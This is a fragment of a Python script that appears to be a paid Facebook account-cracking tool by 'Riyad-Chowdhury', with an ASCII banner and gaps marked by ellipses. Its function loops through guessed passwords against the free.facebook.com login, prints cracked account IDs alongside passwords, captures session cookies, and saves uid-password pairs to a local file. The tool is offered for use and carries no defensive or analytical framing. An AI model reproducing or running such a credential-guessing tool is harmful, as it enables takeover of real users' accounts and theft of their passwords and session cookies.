...
ooooooooo.   ooooo oooooo   oooo       .o.       oooooooooo.   
`888   `Y88. `888'  `888.   .8'       .888.      `888'   `Y8b  
 888   .d88'  888    `888. .8'       .8"888.      888      888 
 888ooo88P'   888     `888.8'       .8' `888.     888      888 
 888`88b.     888      `888'       .88ooo8888.    888      888 
 888  `88b.   888       888       .8'     `888.   888     d88' 
o888o  o888o o888o     o888o     o88o     o8888o o888bood8P'   
...
└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━————————–—━━━━━┘
    ...
    ┌━━━━━━━━━━━━━━━━━ Riyad ━━━━━━━━━━━━━━━━━━┑
               \033[1;97mCREATED BY   :  Riyad-Chowdhury             
               \033[1;91mFACEBOK      :  Riyad Chowdhury                
               \033[1;97mGITHUB       :  Mehedi-Hasan
               \033[1;91mSTATUS       :   PAID💵💶           
               \033[1;97mTEAM         :  Riyad- Chowdhury Team                
...
def c(uid,pwx,ln):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r%s[Riyadg_H4CKER] [%s/%s] [OK-%s] [CP-%s] \r'%(wa,loop,ln,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            'referer': 'https://free.facebook.com/login.php?next=https%3A%2F%2Ffree.facebook.com%2Flogin%2Fdevice-based%2Finvalidate-nonce%2F&ref=104&refsrc=deprecated',
         ...
         #   log_cookies=session.cookies.get_dict().keys()
            ...
            #	botok(uid,ps)
            	...
            	cid = coki[65:80]
            	print('\033[1;92mRiyad-OK[😁]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
            	...
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[82:97]
            	print('\33[1;30m(Riyad-cp [💔] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
            	#print('\033[1;92m[\033[1;92mðŸª\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('Riyad-Cp.txt', 'a').write( uid+' | '+ps+' \n')
            	cps.append(cid)
            	break
            else:
            	#print (random_header())
